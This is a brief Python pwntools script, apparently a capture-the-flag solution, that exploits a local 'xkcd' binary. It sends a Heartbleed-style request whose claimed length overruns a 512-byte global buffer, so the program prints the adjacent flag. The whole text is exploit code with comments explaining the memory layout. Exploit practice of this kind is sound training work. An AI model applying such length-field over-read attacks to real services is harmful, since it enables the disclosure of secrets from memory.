from pwn import *

p = process("./xkcd")


srv = "SERVER, ARE YOU STILL THERE?"
rep = " IF SO, REPLY "


# memory layout is [global_array][flag]
# write 512 B's, filling the global char array exactly.
global_arr_content = "B"*512

# brute force the flag len
# this causes the null terminator to be written after the flag
# and prevents our B's from being terminated.
# puts(global_array) will print our B's and the flag!
write_null_at = str(512 + 19)

string = srv + rep + '\"' + global_arr_content + '\"' + "(CCCC(" + write_null_at + ")"

p.sendline(string)

print p.recv()
